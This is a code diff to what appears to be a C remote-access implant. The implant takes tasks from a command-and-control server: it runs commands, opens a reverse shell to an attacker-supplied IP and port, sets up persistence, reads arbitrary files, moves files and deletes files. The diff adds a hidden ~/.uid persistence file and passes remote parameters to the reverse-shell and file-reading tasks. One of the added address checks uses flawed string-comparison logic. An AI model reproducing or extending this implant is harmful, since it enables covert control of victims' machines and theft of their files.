@@ -54,7 +54,32 @@ const int server_port = 8080;
 const int buffer_size = 1024;
 
 void get_uid() {
+    // Obtenir le nom d'utilisateur actuel
     char *username = get_username();
+    
+    // Construire le chemin vers /home/$user/.uid
+    char uid_path[256];
+    snprintf(uid_path, sizeof(uid_path), "/home/%s/.uid", username);
+    printf("Recherche du fichier de persistance: %s\n", uid_path);
+    
+    // Vérifier si un fichier .uid existe
+    FILE *uid_file = fopen(uid_path, "r");
+    if (uid_file != NULL) {
+        // Lire l'UID du fichier
+        if (fgets(uid, sizeof(uid), uid_file) != NULL) {
+            // Supprimer les caractères de nouvelle ligne s'il y en a
+            char *newline = strchr(uid, '\n');
+            if (newline != NULL) {
+                *newline = '\0';
+            }
+            fclose(uid_file);
+            printf("UID chargé depuis fichier de persistance: '%s'\n", uid);
+            return;
+        }
+        fclose(uid_file);
+    }
+    
+    // Si le fichier n'existe pas ou est vide, obtenir un nouvel UID
     char *hostname = get_hostname();
     char *os = get_os();
 
@@ -84,6 +109,21 @@ void get_uid() {
     }
     
     free(response);
+
+    // Après avoir obtenu un nouvel UID du serveur, créer le fichier de persistance
+    if (strcmp(uid, "unknown") != 0) {
+        printf("Création automatique du fichier de persistance: %s\n", uid_path);
+        FILE *fp = fopen(uid_path, "w");
+        if (fp != NULL) {
+            fprintf(fp, "%s", uid);
+            fclose(fp);
+            printf("UID %s sauvegardé dans %s\n", uid, uid_path);
+        } else {
+            printf("Impossible de créer le fichier de persistance %s\n", uid_path);
+            perror("Erreur");
+        }
+    }
+    
     printf("UID Machine : '%s'\n", uid);
 }
 
@@ -115,14 +155,13 @@ void check_commands() {
         return;
     }
     
-    // Format attendu: "type,id_task,command,argument"
     char* type = strtok(result, ",");
     
     if (type != NULL) {
         char* id_task = strtok(NULL, ",");
         if (strcmp(type, "EXECVE") == 0) {
             char* command = strtok(NULL, ",");
-            char* argument = strtok(NULL, ",");  // Get the argument as well
+            char* argument = strtok(NULL, ",");  
             task_execve(command, argument, id_task);
         } else if (strcmp(type, "SLEEP") == 0) {
             char* sleep_time_str = strtok(NULL, ",");
@@ -131,11 +170,20 @@ void check_commands() {
         } else if (strcmp(type, "LOCATE") == 0) {
             task_locate(id_task);
         } else if (strcmp(type, "REVSHELL") == 0) {
-            task_revshell();
+            char* server_port_str = decode(strtok(NULL, ","));
+            int server_port = atoi(server_port_str);
+            char* server_ip = strtok(NULL, ",");
+            if (strcmp(server_ip, "null") == 1) {
+                server_ip = decode(server_ip);
+            } else {
+                server_ip = "127.0.0.1";
+            }
+            task_revshell(server_port, server_ip);
         } else if (strcmp(type, "PERSIST") == 0) {
             task_persist();
         } else if (strcmp(type, "CAT") == 0) {
-            task_cat();
+            char* file_path = strtok(NULL, ","); 
+            task_cat(file_path, id_task);
         } else if (strcmp(type, "MV") == 0) {
             task_mv();
         } else if (strcmp(type, "RM") == 0) {
